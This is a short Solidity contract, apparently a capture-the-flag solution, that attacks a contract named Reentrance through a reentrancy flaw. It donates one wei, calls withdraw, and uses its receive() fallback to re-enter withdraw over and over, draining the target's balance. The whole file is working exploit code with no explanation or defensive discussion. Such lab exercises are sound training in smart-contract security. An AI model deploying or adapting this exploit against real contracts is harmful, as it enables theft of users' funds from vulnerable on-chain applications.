// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./Reentrance.sol";
import "hardhat/console.sol";


contract AttackingReentrance {
    address payable public contractAddress;
    Reentrance private reentrance;

    constructor(address payable _contractAddress) payable {
        contractAddress = _contractAddress;
        reentrance = Reentrance(_contractAddress);
    }

    function hackContract() external {
        reentrance.donate{value: 1}(address(this));
        console.log("Balance of contract: ", reentrance.balanceOf(address(this)));
        reentrance.withdraw();
    }

    receive() external payable {
        reentrance.withdraw();
    }
}
